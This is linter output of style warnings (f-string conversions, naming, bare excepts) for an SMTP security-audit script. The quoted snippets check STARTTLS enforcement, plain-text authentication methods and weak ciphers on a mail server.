3630 |                 _out("\tReturned: ({})".format(str(out)))
     |
help: Convert to f-string

E722 Do not use bare `except`
    --> security\penetration-testing-tools\networks\smtpAudit.py:3629:13
     |
3627 |             try:
3628 |                 _out("\tReturned: {} ({})".format(out[0], out[1].decode()))
3629 |             except:
     |             ^^^^^^
3630 |                 _out("\tReturned: ({})".format(str(out)))
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3630:22
     |
3628 |                 _out("\tReturned: {} ({})".format(out[0], out[1].decode()))
3629 |             except:
3630 |                 _out("\tReturned: ({})".format(str(out)))
     |                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3631 |
3632 |             result = True
     |
help: Convert to f-string

C417 Unnecessary `map()` usage (rewrite using a generator expression)
    --> security\penetration-testing-tools\networks\smtpAudit.py:3647:29
     |
3645 |                 return None
3646 |
3647 |         ret = "starttls" in map(lambda x: x.lower(), self.availableServices)
     |                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3648 |
3649 |         if ret or self.ssl:
     |
help: Replace `map()` with a generator expression

E712 Avoid equality comparisons to `False`; use `not ret:` for false checks
    --> security\penetration-testing-tools\networks\smtpAudit.py:3674:16
     |
3672 |         for service in SmtpTester.smtpAuthServices:
3673 |             ret = self.testSSLAuthEnforcementForService(service)
3674 |             if ret == False:
     |                ^^^^^^^^^^^^
3675 |                 return ret
     |
help: Replace with `not ret`

N806 Variable `authMethods` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3680:9
     |
3679 |     def testSSLAuthEnforcementForService(self, service):
3680 |         authMethods = self.getAuthMethods(service)
     |         ^^^^^^^^^^^
3681 |         ret = True
3682 |         emptyMethods = False
     |

F841 Local variable `ret` is assigned to but never used
    --> security\penetration-testing-tools\networks\smtpAudit.py:3681:9
     |
3679 |     def testSSLAuthEnforcementForService(self, service):
3680 |         authMethods = self.getAuthMethods(service)
3681 |         ret = True
     |         ^^^
3682 |         emptyMethods = False
     |
help: Remove assignment to unused variable `ret`

N806 Variable `emptyMethods` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3682:9
     |
3680 |         authMethods = self.getAuthMethods(service)
3681 |         ret = True
3682 |         emptyMethods = False
     |         ^^^^^^^^^^^^
3683 |
3684 |         notSupportedCodes = (500, 502, 503, 504, 535)
     |

N806 Variable `notSupportedCodes` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3684:9
     |
3682 |         emptyMethods = False
3683 |
3684 |         notSupportedCodes = (500, 502, 503, 504, 535)
     |         ^^^^^^^^^^^^^^^^^
3685 |         unsecureConfigurationCodes = ()
     |

N806 Variable `unsecureConfigurationCodes` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3685:9
     |
3684 |         notSupportedCodes = (500, 502, 503, 504, 535)
3685 |         unsecureConfigurationCodes = ()
     |         ^^^^^^^^^^^^^^^^^^^^^^^^^^
3686 |
3687 |         for authMethod in authMethods:
     |

F841 Local variable `unsecureConfigurationCodes` is assigned to but never used
    --> security\penetration-testing-tools\networks\smtpAudit.py:3685:9
     |
3684 |         notSupportedCodes = (500, 502, 503, 504, 535)
3685 |         unsecureConfigurationCodes = ()
     |         ^^^^^^^^^^^^^^^^^^^^^^^^^^
3686 |
3687 |         for authMethod in authMethods:
     |
help: Remove assignment to unused variable `unsecureConfigurationCodes`

N806 Variable `authMethod` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3687:13
     |
3685 |         unsecureConfigurationCodes = ()
3686 |
3687 |         for authMethod in authMethods:
     |             ^^^^^^^^^^
3688 |             if authMethod.upper() == "NTLM":
3689 |                 _out(
     |

N806 Variable `emptyMethods` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3703:13
     |
3702 |         if not authMethods:
3703 |             emptyMethods = True
     |             ^^^^^^^^^^^^
3704 |             authMethods = SmtpTester.commonSmtpAuthMethods.keys()
     |

N806 Variable `authMethods` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3704:13
     |
3702 |         if not authMethods:
3703 |             emptyMethods = True
3704 |             authMethods = SmtpTester.commonSmtpAuthMethods.keys()
     |             ^^^^^^^^^^^
3705 |
3706 |         for authMethod in authMethods:
     |

N806 Variable `authMethod` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3706:13
     |
3704 |             authMethods = SmtpTester.commonSmtpAuthMethods.keys()
3705 |
3706 |         for authMethod in authMethods:
     |             ^^^^^^^^^^
3707 |             dbg("Checking authentication method: {}".format(authMethod))
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3707:17
     |
3706 |         for authMethod in authMethods:
3707 |             dbg("Checking authentication method: {}".format(authMethod))
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3708 |
3709 |             if authMethod.upper() in SmtpTester.authMethodsNotNeedingStarttls:
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3711:21
     |
3709 |               if authMethod.upper() in SmtpTester.authMethodsNotNeedingStarttls:
3710 |                   dbg(
3711 | /                     "Method {} does not need to be issued after STARTTLS.".format(
3712 | |                         authMethod.upper()
3713 | |                     )
     | |_____________________^
3714 |                   )
3715 |                   # continue
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3718:21
     |
3717 |             auths = []
3718 |             _auth = "{} {}".format(service, authMethod)
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3719 |
3720 |             if authMethod in SmtpTester.commonSmtpAuthMethods.keys():
     |
help: Convert to f-string

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\networks\smtpAudit.py:3720:16
     |
3718 |             _auth = "{} {}".format(service, authMethod)
3719 |
3720 |             if authMethod in SmtpTester.commonSmtpAuthMethods.keys():
     |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3721 |                 param = SmtpTester.commonSmtpAuthMethods[authMethod]
     |
help: Remove `.keys()`

SIM101 Multiple `isinstance` calls for `param`, merge into a single call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3729:22
     |
3727 |                     _auth += " " + param
3728 |                     auths.append(_auth)
3729 |                 elif isinstance(param, list) or isinstance(param, tuple):
     |                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3730 |                     for n in param:
3731 |                         if isinstance(param, bytes):
     |
help: Merge `isinstance` calls for `param`

SIM101 Multiple `isinstance` calls for `n`, merge into a single call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3740:30
     |
3738 |                             )
3739 |                             auths.append(n)
3740 |                         elif isinstance(n, list) or isinstance(n, tuple):
     |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3741 |                             auths.append(_auth)
3742 |                             for m in n:
     |
help: Merge `isinstance` calls for `n`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3760:21
     |
3759 |                   dbg(
3760 | /                     "The server responded for {} command with: ({})".format(
3761 | |                         auth, str(out)
3762 | |                     )
     | |_____________________^
3763 |                   )
     |
help: Convert to f-string

E712 Avoid equality comparisons to `False`; use `not out[0]:` for false checks
    --> security\penetration-testing-tools\networks\smtpAudit.py:3765:31
     |
3763 |                 )
3764 |
3765 |                 if not out or out[0] == False:
     |                               ^^^^^^^^^^^^^^^
3766 |                     dbg("Something gone wrong along the way.")
     |
help: Replace with `not out[0]`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3770:25
     |
3768 |                   elif out and out[0] in notSupportedCodes:
3769 |                       dbg(
3770 | /                         "The {} {} method is either not supported or not available.".format(
3771 | |                             service, authMethod
3772 | |                         )
     | |_________________________^
3773 |                       )
3774 |                       index += 1
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3778:25
     |
3776 |                   elif not out[0] and not out[1]:
3777 |                       info(
3778 | /                         "The server disconnected during {} {}, this might be secure.".format(
3779 | |                             service, authMethod
3780 | |                         )
     | |_________________________^
3781 |                       )
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3788:26
     |
3786 |                         "UNSECURE: STARTTLS seems to be not available on the server side."
3787 |                     )
3788 |                     _out('\tReturned: {} ("{}")'.format(out[0], out[1].decode()))
     |                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3789 |                     return False
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3799:33
     |
3797 |                           if not self.ssl:
3798 |                               fail(
3799 | /                                 'UNSECURE: Server allowed authentication over non-SSL channel via "{} {}"!'.format(
3800 | |                                     service, authMethod
3801 | |                                 )
     | |_________________________________^
3802 |                               )
3803 |                               _out(
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3804:33
     |
3802 | ΓÇª                     )
3803 | ΓÇª                     _out(
3804 | ΓÇª                         '\tReturned: {} ("{}")'.format(out[0], out[1].decode())
     |                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3805 | ΓÇª                     )
3806 | ΓÇª                     return False
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3810:29
     |
3808 |                       else:
3809 |                           dbg(
3810 | /                             "The {} {} method is not understood.: ({})".format(
3811 | |                                 service, authMethod, str(out)
3812 | |                             )
     | |_____________________________^
3813 |                           )
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3817:25
     |
3815 |                   elif out and not (out[0] in (530,) and b"starttls" in out[1].lower()):
3816 |                       fail(
3817 | /                         'UNSECURE: For method "{} {}" the server did not required STARTTLS!'.format(
3818 | |                             service, authMethod
3819 | |                         )
     | |_________________________^
3820 |                       )
3821 |                       _out('\tReturned: {} ("{}")'.format(out[0], out[1].decode()))
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3821:26
     |
3819 |                         )
3820 |                     )
3821 |                     _out('\tReturned: {} ("{}")'.format(out[0], out[1].decode()))
     |                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3822 |                     return False
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3826:25
     |
3824 |                   elif out and (out[0] == 530 and b"STARTTLS" in out[1]):
3825 |                       ok(
3826 | /                         "SECURE: Server enforces SSL/TLS channel negotation before {}.".format(
3827 | |                             service
3828 | |                         )
     | |_________________________^
3829 |                       )
3830 |                       _out('\tReturned: {} ("{}")'.format(out[0], out[1].decode()))
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3830:26
     |
3828 |                         )
3829 |                     )
3830 |                     _out('\tReturned: {} ("{}")'.format(out[0], out[1].decode()))
     |                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3831 |                     return True
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3834:16
     |
3833 |         if set(authMethods) <= set(SmtpTester.authMethodsNotNeedingStarttls):
3834 |             ok("SECURE: There were no {} methods requiring STARTTLS.".format(service))
     |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3835 |             return True
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3838:18
     |
3837 |         if emptyMethods:
3838 |             info("The server does not offer any {} methods to enforce.".format(service))
     |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3839 |         else:
3840 |             info(
     |
help: Convert to f-string

N806 Variable `performedStarttls` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3853:9
     |
3851 |     #
3852 |     def testSecureCiphers(self):
3853 |         performedStarttls = False
     |         ^^^^^^^^^^^^^^^^^
3854 |         if not self.starttlsSucceeded:
3855 |             dbg("STARTTLS session has not been set yet. Setting up...")
     |

N806 Variable `performedStarttls` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3856:13
     |
3854 |         if not self.starttlsSucceeded:
3855 |             dbg("STARTTLS session has not been set yet. Setting up...")
3856 |             performedStarttls = self.performStarttls()
     |             ^^^^^^^^^^^^^^^^^
3857 |
3858 |         if not self.ssl and not performedStarttls and not self.starttlsSucceeded:
     |

N806 Variable `cipherUsed` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3863:13
     |
3862 |         try:
3863 |             cipherUsed = self.server_tls_params["cipher"]
     |             ^^^^^^^^^^
3864 |             version = self.server_tls_params["version"]
3865 |         except (KeyError, AttributeError):
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3869:13
     |
3867 |             return None
3868 |
3869 |         dbg("Offered cipher: {} and version: {}".format(cipherUsed, version))
     |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3870 |
3871 |         if cipherUsed[0].upper() in SmtpTester.secureCipherSuitesList:
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3873:18
     |
3871 |         if cipherUsed[0].upper() in SmtpTester.secureCipherSuitesList:
3872 |             ok("SECURE: Offered cipher is considered secure.")
3873 |             _out("\tCipher: {}".format(cipherUsed[0]))
     |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3874 |             return True
     |
help: Convert to f-string

N806 Variable `secureCipher` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3876:13
     |
3874 |             return True
3875 |
3876 |         for secureCipher in SmtpTester.secureCipherSuitesList:
     |             ^^^^^^^^^^^^
3877 |             ciphers = set(secureCipher.split("-"))
3878 |             cipherUsedSet = set(cipherUsed[0].upper().split("-"))
     |

N806 Variable `cipherUsedSet` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3878:13
     |
3876 |         for secureCipher in SmtpTester.secureCipherSuitesList:
3877 |             ciphers = set(secureCipher.split("-"))
3878 |             cipherUsedSet = set(cipherUsed[0].upper().split("-"))
     |             ^^^^^^^^^^^^^
3879 |
3880 |             intersection = ciphers.intersection(cipherUsedSet)
     |

N806 Variable `minWords` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3881:13
     |
3880 |             intersection = ciphers.intersection(cipherUsedSet)
3881 |             minWords = min(len(ciphers), len(cipherUsedSet))
     |             ^^^^^^^^
3882 |             if minWords >= 3 and len(intersection) >= (minWords - 1):
3883 |                 ok("SECURE: Offered cipher is having secure structure.")
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3884:22
     |
3882 |             if minWords >= 3 and len(intersection) >= (minWords - 1):
3883 |                 ok("SECURE: Offered cipher is having secure structure.")
3884 |                 _out("\tCipher: {}".format(cipherUsed))
     |                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3885 |
3886 |                 return True
     |
help: Convert to f-string

N806 Variable `unsecureCiphers` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3888:9
     |
3886 |                 return True
3887 |
3888 |         unsecureCiphers = (
     |         ^^^^^^^^^^^^^^^
3889 |             "RC4",
3890 |             "3DES",
     |

N806 Variable `usedUnsecureCipher` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3893:9
     |
3891 |             "DES",
3892 |         )
3893 |         usedUnsecureCipher = ""
     |         ^^^^^^^^^^^^^^^^^^
3894 |
3895 |         for cipher in unsecureCiphers:
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3898:22
     |
3896 |             if cipher in cipherUsed[0].upper():
3897 |                 fail("SMTP Server offered unsecure cipher.")
3898 |                 _out("\tCipher: {}".format(cipher))
     |                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3899 |                 return False
     |
help: Convert to f-string

N806 Variable `usedSSL` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3901:9
     |
3899 |                 return False
3900 |
3901 |         usedSSL = "ssl" in version.lower()
     |         ^^^^^^^
3902 |
3903 |         unsecureSSLs = ("sslv2", "sslv3")
     |

N806 Variable `unsecureSSLs` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3903:9
     |
3901 |         usedSSL = "ssl" in version.lower()
3902 |
3903 |         unsecureSSLs = ("sslv2", "sslv3")
     |         ^^^^^^^^^^^^
3904 |         if "shared_ciphers" in self.server_tls_params.keys():
3905 |             unsecureProtocolsOffered = set()
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\networks\smtpAudit.py:3904:12
     |
3903 |         unsecureSSLs = ("sslv2", "sslv3")
3904 |         if "shared_ciphers" in self.server_tls_params.keys():
     |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3905 |             unsecureProtocolsOffered = set()
3906 |             for s in self.server_tls_params["shared_ciphers"]:
     |
help: Remove `.keys()`

N806 Variable `unsecureProtocolsOffered` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3905:13
     |
3903 |         unsecureSSLs = ("sslv2", "sslv3")
3904 |         if "shared_ciphers" in self.server_tls_params.keys():
3905 |             unsecureProtocolsOffered = set()
     |             ^^^^^^^^^^^^^^^^^^^^^^^^
3906 |             for s in self.server_tls_params["shared_ciphers"]:
3907 |                 dbg("Offered cipher (22222): {}".format(s[1]))
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3907:21
     |
3905 |             unsecureProtocolsOffered = set()
3906 |             for s in self.server_tls_params["shared_ciphers"]:
3907 |                 dbg("Offered cipher (22222): {}".format(s[1]))
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3908 |                 if s[1].lower() in unsecureSSLs:
3909 |                     unsecureProtocolsOffered.add(s[1])
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3914:22
     |
3912 |                 out = ", ".join(unsecureProtocolsOffered)
3913 |
3914 |                 fail("SMTP Server offered unsecure SSL/TLS protocols: {}".format(out))
     |                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3915 |                 return False
3916 |         else:
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3925:18
     |
3923 |         else:
3924 |             fail("UNSECURE: SMTP Server offered unsecure encryption suite.")
3925 |             _out("\tCipher: {}".format(usedUnsecureCipher))
     |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3926 |             return False
     |
help: Convert to f-string

E712 Avoid equality comparisons to `False`; use `not ret:` for false checks
    --> security\penetration-testing-tools\networks\smtpAudit.py:3936:16
     |
3934 |         for service in SmtpTester.smtpAuthServices:
3935 |             ret = self.testSecureAuthMethodsForService(service)
3936 |             if ret == False:
     |                ^^^^^^^^^^^^
3937 |                 return ret
3938 |             elif ret == True:
     |
help: Replace with `not ret`

E712 Avoid equality comparisons to `True`; use `ret:` for truth checks
    --> security\penetration-testing-tools\networks\smtpAudit.py:3938:18
     |
3936 |             if ret == False:
3937 |                 return ret
3938 |             elif ret == True:
     |                  ^^^^^^^^^^^
3939 |                 # ret may be also 'None'
3940 |                 success = True
     |
help: Replace with `ret`

N806 Variable `authMethods` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3945:9
     |
3944 |     def testSecureAuthMethodsForService(self, service):
3945 |         authMethods = self.getAuthMethods(service)
     |         ^^^^^^^^^^^
3946 |
3947 |         unsecureAuthMethods = ("PLAIN", "LOGIN")
     |

N806 Variable `unsecureAuthMethods` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3947:9
     |
3945 |         authMethods = self.getAuthMethods(service)
3946 |
3947 |         unsecureAuthMethods = ("PLAIN", "LOGIN")
     |         ^^^^^^^^^^^^^^^^^^^
3948 |         ret = True
3949 |         methods = set()
     |

N806 Variable `authMethods` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3952:13
     |
3951 |         if not authMethods:
3952 |             authMethods = SmtpTester.commonSmtpAuthMethods
     |             ^^^^^^^^^^^
3953 |             foundMethods = []
     |

N806 Variable `foundMethods` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3953:13
     |
3951 |         if not authMethods:
3952 |             authMethods = SmtpTester.commonSmtpAuthMethods
3953 |             foundMethods = []
     |             ^^^^^^^^^^^^
3954 |
3955 |             dbg(
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3956:17
     |
3955 |               dbg(
3956 | /                 "The server is not offering any {} method. Going to try to discover ones.".format(
3957 | |                     service
3958 | |                 )
     | |_________________^
3959 |               )
     |
help: Convert to f-string

N806 Variable `authMethod` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:3961:17
     |
3959 |             )
3960 |
3961 |             for authMethod in authMethods:
     |                 ^^^^^^^^^^
3962 |                 if authMethod in SmtpTester.authMethodsNotNeedingStarttls:
3963 |                     dbg(
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3964:25
     |
3962 |                   if authMethod in SmtpTester.authMethodsNotNeedingStarttls:
3963 |                       dbg(
3964 | /                         "Method: {} {} is considered not needing STARTTLS.".format(
3965 | |                             service, authMethod
3966 | |                         )
     | |_________________________^
3967 |                       )
3968 |                       continue
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3970:24
     |
3968 |                     continue
3969 |
3970 |                 auth = "{} {}".format(service, authMethod)
     |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3971 |                 out = self.sendcmd(auth)
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3980:26
     |
3978 |                     )
3979 |                 ):
3980 |                     info("UNKNOWN: {} method not available at all.".format(service))
     |                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3981 |                     return None
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3984:25
     |
3983 |                 elif out and out[0] in (334,):
3984 |                     dbg("Authentication via {} is supported".format(auth))
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3985 |                     foundMethods.append(authMethod)
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3990:33
     |
3988 |                           if not self.ssl:
3989 |                               fail(
3990 | /                                 "UNSECURE: SMTP offers plain-text authentication method: {}!".format(
3991 | |                                     auth
3992 | |                                 )
     | |_________________________________^
3993 |                               )
3994 |                           else:
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:3996:33
     |
3994 |                           else:
3995 |                               ok(
3996 | /                                 "SECURE: SMTP offered plain-text authentication method over SSL: {}!".format(
3997 | |                                     auth
3998 | |                                 )
     | |_________________________________^
3999 |                               )
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:4002:29
     |
4001 |                         _out(
4002 |                             '\tOffered reply: {} ("{}")'.format(out[0], out[1].decode())
     |                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
4003 |                         )
     |
help: Convert to f-string

E712 Avoid equality comparisons to `False`; use `not out[0]:` for false checks
    --> security\penetration-testing-tools\networks\smtpAudit.py:4008:20
     |
4006 |                         break
4007 |
4008 |                 if out[0] == False and out[1] == False:
     |                    ^^^^^^^^^^^^^^^
4009 |                     info(
4010 |                         "UNKNOWN: The server has disconnected while checking"
     |
help: Replace with `not out[0]`

E712 Avoid equality comparisons to `False`; use `not out[1]:` for false checks
    --> security\penetration-testing-tools\networks\smtpAudit.py:4008:40
     |
4006 |                         break
4007 |
4008 |                 if out[0] == False and out[1] == False:
     |                                        ^^^^^^^^^^^^^^^
4009 |                     info(
4010 |                         "UNKNOWN: The server has disconnected while checking"
     |
help: Replace with `not out[1]`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:4010:25
     |
4008 |                   if out[0] == False and out[1] == False:
4009 |                       info(
4010 | /                         "UNKNOWN: The server has disconnected while checking"
4011 | |                         " {}. This might be secure".format(auth)
     | |________________________________________________________________^
4012 |                       )
4013 |                       return None
     |
help: Convert to f-string

N806 Variable `authMethod` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:4017:17
     |
4015 |                 methods = foundMethods
4016 |         else:
4017 |             for authMethod in authMethods:
     |                 ^^^^^^^^^^
4018 |                 if authMethod.upper() in unsecureAuthMethods:
4019 |                     if not self.ssl:
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:4021:29
     |
4019 |                       if not self.ssl:
4020 |                           fail(
4021 | /                             "UNSECURE: SMTP server offers plain-text authentication method: {}.".format(
4022 | |                                 authMethod
4023 | |                             )
     | |_____________________________^
4024 |                           )
4025 |                       else:
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:4027:29
     |
4025 |                       else:
4026 |                           ok(
4027 | /                             "SECURE: SMTP server offered plain-text authentication method over SSL: {}.".format(
4028 | |                                 authMethod
4029 | |                             )
     | |_____________________________^
4030 |                           )
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:4046:18
     |
4044 |             pass
4045 |         elif not methods:
4046 |             info("UNKNOWN: The server does not offer any {} methods.".format(service))
     |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
4047 |
4048 |             return None
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:4050:13
     |
4048 |             return None
4049 |
4050 |         dbg("ret = {}, methods = {}".format(ret, methods))
     |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
4051 |
4052 |         return ret
     |
help: Convert to f-string

N806 Variable `performedStarttls` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:4059:9
     |
4057 |     #
4058 |     def testSSLKeyLen(self):
4059 |         performedStarttls = False
     |         ^^^^^^^^^^^^^^^^^
4060 |         if not self.server_tls_params or not self.starttlsSucceeded:
4061 |             dbg("STARTTLS session has not been set yet. Setting up...")
     |

N806 Variable `performedStarttls` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:4062:13
     |
4060 |         if not self.server_tls_params or not self.starttlsSucceeded:
4061 |             dbg("STARTTLS session has not been set yet. Setting up...")
4062 |             performedStarttls = self.performStarttls()
     |             ^^^^^^^^^^^^^^^^^
4063 |
4064 |         if not performedStarttls and not self.starttlsSucceeded:
     |

N806 Variable `cipherUsed` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:4069:13
     |
4068 |         try:
4069 |             cipherUsed = self.server_tls_params["cipher"]
     |             ^^^^^^^^^^
4070 |             version = self.server_tls_params["version"]
4071 |             sharedCiphers = self.server_tls_params["shared_ciphers"]
     |

N806 Variable `sharedCiphers` in function should be lowercase
    --> security\penetration-testing-tools\networks\smtpAudit.py:4071:13
     |
4069 |             cipherUsed = self.server_tls_params["cipher"]
4070 |             version = self.server_tls_params["version"]
4071 |             sharedCiphers = self.server_tls_params["shared_ciphers"]
     |             ^^^^^^^^^^^^^
4072 |         except (KeyError, AttributeError):
4073 |             err("Could not initiate successful STARTTLS session. Failure")
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\networks\smtpAudit.py:4076:13
     |
4074 |             return None
4075 |
4076 |         dbg("Offered cipher: {} and version: {}".format(cipherUsed, version))
     |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
4077 |
4078 |         keyLen = cipherUsed[2] * 8
     |
help: Convert to f-string

N806 Variable `keyLen` in function should be lowercase
